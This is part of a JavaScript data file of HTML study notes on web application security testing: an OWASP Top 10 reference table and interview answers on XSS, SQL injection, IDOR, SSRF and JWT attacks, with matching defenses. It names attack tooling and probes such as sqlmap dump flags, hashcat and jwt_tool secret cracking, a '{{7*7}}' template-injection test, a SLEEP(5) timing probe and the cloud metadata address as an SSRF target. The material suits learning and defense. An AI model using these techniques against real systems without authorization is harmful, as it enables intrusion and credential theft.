    <tr><td>OWASP 2021</td><td>A01 Broken Access Control</td><td>Authorization checks missing/wrong — includes IDOR/BOLA</td></tr>
    <tr><td>OWASP 2021</td><td>A02 Cryptographic Failures</td><td>Sensitive data exposed via weak/missing encryption</td></tr>
    <tr><td>OWASP 2021</td><td>A03 Injection</td><td>SQLi, command injection, SSTI, XSS, LFI/path traversal</td></tr>
    <tr><td>OWASP 2021</td><td>A04 Insecure Design</td><td>Flawed design/business logic, not just a coding bug</td></tr>
    <tr><td>OWASP 2021</td><td>A05 Security Misconfiguration</td><td>Defaults, verbose errors, unnecessary features, missing headers, XXE-enabled parsers</td></tr>
    <tr><td>OWASP 2021</td><td>A06 Vulnerable and Outdated Components</td><td>Known-CVE libraries/CMS/plugins — what wpscan targets</td></tr>
    <tr><td>OWASP 2021</td><td>A07 Identification and Authentication Failures</td><td>Session/JWT flaws — alg:none, weak secret</td></tr>
    <tr><td>OWASP 2021</td><td>A08 Software and Data Integrity Failures</td><td>Insecure deserialization, unsigned updates, CI/CD tampering</td></tr>
    <tr><td>OWASP 2021</td><td>A09 Security Logging and Monitoring Failures</td><td>Attacks go undetected due to missing logging/alerting</td></tr>
    <tr><td>OWASP 2021</td><td>A10 Server-Side Request Forgery</td><td>Server fetches an attacker-supplied URL — cloud metadata is the classic target</td></tr>
    <tr><td>Proxy tool</td><td>Burp Suite</td><td>Proxy / Repeater / Intruder / Decoder / Comparer / Scanner (Pro)</td></tr>
    <tr><td>Proxy tool</td><td>OWASP ZAP</td><td>Free proxy + spider + active scan; <code>zap-baseline.py</code> for CI</td></tr>
    <tr><td>SQLi</td><td>UNION / error / blind boolean / blind time</td><td>The four sqlmap detection techniques, in rough order of "signal strength"</td></tr>
    <tr><td>SQLi tool</td><td><code>sqlmap</code></td><td>Automated SQLi detection and exploitation — <code>--dbs</code>, <code>--dump</code>, <code>--technique</code>, <code>--level</code>/<code>--risk</code></td></tr>
    <tr><td>XSS</td><td>Reflected / Stored / DOM</td><td>Immediate response only / saved &amp; served to others / never touches the server</td></tr>
    <tr><td>Access control</td><td>IDOR / BOLA</td><td>Same flaw, two names — general web Top 10 vs. OWASP API Security Top 10 (API1:2023)</td></tr>
    <tr><td>Request forgery</td><td>CSRF</td><td>Forged state-changing request riding the victim's session cookie; folded into A01 in 2021</td></tr>
    <tr><td>Request forgery</td><td>SSRF</td><td>Server fetches an attacker-chosen URL — A10; classic target is cloud instance metadata</td></tr>
    <tr><td>Injection variant</td><td>XXE</td><td>Malicious external entity in user-supplied XML reads local files or reaches internal hosts</td></tr>
    <tr><td>Injection variant</td><td>LFI / RFI</td><td>Local/Remote File Inclusion — path traversal to read files or execute remote code</td></tr>
    <tr><td>Injection variant</td><td>Command injection</td><td>User input reaches a shell command — <code>;</code>, <code>&amp;&amp;</code>, <code>|</code>, <code>$()</code> chaining</td></tr>
    <tr><td>Injection variant</td><td>SSTI</td><td>User input evaluated by a server-side template engine — <code>{{7*7}}</code> detection ladder</td></tr>
    <tr><td>Auth</td><td>JWT <code>alg:none</code></td><td>Forged token accepted when the verifier trusts the token's own claimed algorithm</td></tr>
    <tr><td>Auth</td><td>JWT weak secret</td><td>HS256 signing secret crackable offline — <code>jwt_tool -C</code>, <code>hashcat -m 16500</code></td></tr>
    <tr><td>Content discovery</td><td><code>gobuster</code> / <code>ffuf</code> / <code>feroxbuster</code> / <code>dirb</code></td><td>Directory/file brute-forcing tools, roughly newest/fastest to oldest</td></tr>
    <tr><td>Fingerprinting</td><td><code>wpscan</code> / <code>nikto</code></td><td>WordPress-specific CVE scanner / general web-server misconfig-and-known-vuln scanner</td></tr>
    <tr><td>Defense</td><td>Parameterized queries</td><td>Fixes SQLi structurally — input is bound as data, never concatenated as SQL</td></tr>
    <tr><td>Defense</td><td>Output encoding / CSP</td><td>Fixes XSS at render time and as a browser-enforced backstop</td></tr>
    <tr><td>Defense</td><td>CSRF tokens / SameSite cookies</td><td>Fixes CSRF via unpredictable per-request tokens and cookie scoping</td></tr>
    <tr><td>Defense</td><td>SSRF allow-lists</td><td>Only reliable SSRF fix — allow-list destinations, never a denylist</td></tr>
    <tr><td>Defense</td><td>WAF</td><td>Mitigating control, not a fix — pattern-matches known payloads, has documented bypasses</td></tr>
    <tr><td>Cross-link</td><td><code>web-security</code> topic</td><td>Same vulnerability classes, taught from the defending-developer side</td></tr>
  </tbody>
</table>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'interview-patterns', title: '🎤 Interview Patterns', html: `
<div class="qa-block">
<div class="qa-q">Walk me through the OWASP Top 10 (2021).</div>
<div class="qa-a">
<p>In order: A01 Broken Access Control (authorization checks missing or wrong, including IDOR/BOLA), A02 Cryptographic Failures (weak/missing encryption of sensitive data), A03 Injection (SQLi, command injection, SSTI, XSS, path traversal — untrusted input treated as code or a path), A04 Insecure Design (a flawed design, not just a buggy implementation), A05 Security Misconfiguration (defaults, verbose errors, misconfigured XML parsers), A06 Vulnerable and Outdated Components (known-CVE libraries/CMS/plugins), A07 Identification and Authentication Failures (session and JWT flaws), A08 Software and Data Integrity Failures (insecure deserialization, unsigned updates, CI/CD tampering), A09 Security Logging and Monitoring Failures (attacks going undetected), and A10 Server-Side Request Forgery (the server fetches an attacker-chosen URL — new to the list in 2021). Worth mentioning proactively: CSRF isn't its own 2021 category anymore (folded into A01, since frameworks now defend against it by default), and OWASP published a newer 2025 edition that re-ranks several categories and folds SSRF back into Broken Access Control — but 2021 is still the version most commonly referenced in interviews and tooling today.</p>
</div>
</div>

<div class="qa-block">
<div class="qa-q">What's the difference between reflected, stored, and DOM-based XSS?</div>
<div class="qa-a">
<p>Reflected XSS is returned in the immediate server response — the payload lives in the request (typically a URL parameter) and only fires when a victim is tricked into clicking a crafted link, so it needs no persistence on the server. Stored XSS is saved server-side (a comment, a profile bio) and executes for every subsequent visitor who views that stored content, with no link-clicking required — generally higher impact for exactly that reason. DOM-based XSS never touches the server at all: client-side JavaScript reads attacker-controlled data (commonly <code>location.hash</code> or <code>document.referrer</code>) and writes it unsafely into the DOM, for example via <code>innerHTML</code> — the vulnerability is entirely in the front-end code's source-to-sink data flow.</p>
</div>
</div>

<div class="qa-block">
<div class="qa-q">What are the four SQL injection detection techniques sqlmap uses, and when would you use each?</div>
<div class="qa-a">
<p>UNION-based appends a matching-column-count <code>UNION SELECT</code> to pull arbitrary data directly into the visible response — fastest and most direct when the response reflects query output. Error-based relies on the database's own verbose error message leaking data, useful when errors are shown but the response doesn't otherwise reflect query results. Blind boolean-based infers data one bit at a time from a true/false difference in the page's content or length when no data or errors are ever shown directly. Blind time-based is the fallback of last resort: inject a deliberate delay (e.g. <code>SLEEP(5)</code>) and infer true/false from response timing, used when the response looks identical either way and there's no content signal to read at all.</p>
</div>
</div>

<div class="qa-block">
<div class="qa-q">What is IDOR/BOLA and how would you test for it?</div>
<div class="qa-a">
<p>It's a broken-access-control flaw where an endpoint accepts an object identifier from the client — an invoice ID, a user ID, an order number — and returns or modifies that object without verifying the authenticated caller is actually authorized to touch it. IDOR is the name used in the general OWASP web Top 10; BOLA is the same underlying issue's name in the OWASP API Security Top 10, where it currently ranks #1 (API1:2023). Testing it is mechanically simple and exactly why Burp Repeater exists for this: authenticate as your own low-privileged account, capture a request that references an object by ID, and change only that ID to another value while keeping your own valid session token — if another user's data comes back, it's IDOR. Switching to random UUIDs instead of sequential integers raises the bar for guessing but doesn't fix the underlying missing authorization check.</p>
</div>
</div>

<div class="qa-block">
<div class="qa-q">What is SSRF and why is cloud instance metadata such a common target for it?</div>
<div class="qa-a">
<p>Server-Side Request Forgery is when an attacker can make the server itself issue a request to a URL of the attacker's choosing — any "fetch this URL" feature (webhooks, URL-based image/PDF previews, "import from a link") is a candidate. Cloud instance metadata endpoints (like AWS's <code>169.254.169.254</code>) are the classic high-value target because they're reachable only from inside the instance itself — the exact vantage point SSRF grants — and, if the legacy unauthenticated metadata protocol (IMDSv1) is in use, a plain GET request to the right path returns the IAM role's temporary access keys, which can then be used to call the cloud provider's API with whatever permissions that role carries. It's a textbook example of a "low-severity-looking" bug (the server can fetch an arbitrary URL) chaining into a full cloud-account compromise, which is why it was promoted to its own OWASP category (A10) in the 2021 edition.</p>
</div>
</div>

<div class="qa-block">
<div class="qa-q">Explain the JWT <code>alg:none</code> and weak-secret attacks.</div>
<div class="qa-a">
<p>Both exploit the fact that a JWT's signature is the only thing making its claims trustworthy. In the <code>alg:none</code> attack, the attacker edits the token's header to claim no signing algorithm was used at all and strips the signature; some libraries historically honored whatever algorithm the token's own header claimed and skipped verification entirely for "none," letting the attacker forge any claims they want — modern libraries reject this by default, but it's still tested since misconfigurations recur. In the weak-secret attack, if the server signs with HS256 using a short or guessable string, that secret can be brute-forced offline (tools like <code>jwt_tool -C</code> or <code>hashcat -m 16500</code> against a wordlist) — and once recovered, the attacker can sign their own tokens with arbitrary claims (e.g. an admin role) that the server will accept as legitimate. The fix for both is to configure the verification library to reject <code>alg:none</code> explicitly and to use either a long random HMAC secret or move to asymmetric signing (RS256/ES256) so the signing key is never shared with anything that only needs to verify.</p>
</div>
</div>

<div class="qa-block">
<div class="qa-q">How would you defend against SQLi, XSS, CSRF, and SSRF, one line each?</div>
<div class="qa-a">
<p>SQLi: parameterized queries/prepared statements, so user input is always bound as data and never concatenated into SQL syntax. XSS: context-aware output encoding at render time, backed by a strict Content-Security-Policy as a browser-enforced second layer. CSRF: unique per-request CSRF tokens validated server-side, paired with <code>SameSite=Lax</code>/<code>Strict</code> cookies as an independent second layer. SSRF: a strict server-side allow-list of exact permitted destination hosts — never a denylist, since denylists are reliably bypassed via redirects, DNS rebinding, or alternate IP encodings.</p>
</div>
</div>
`}

]});
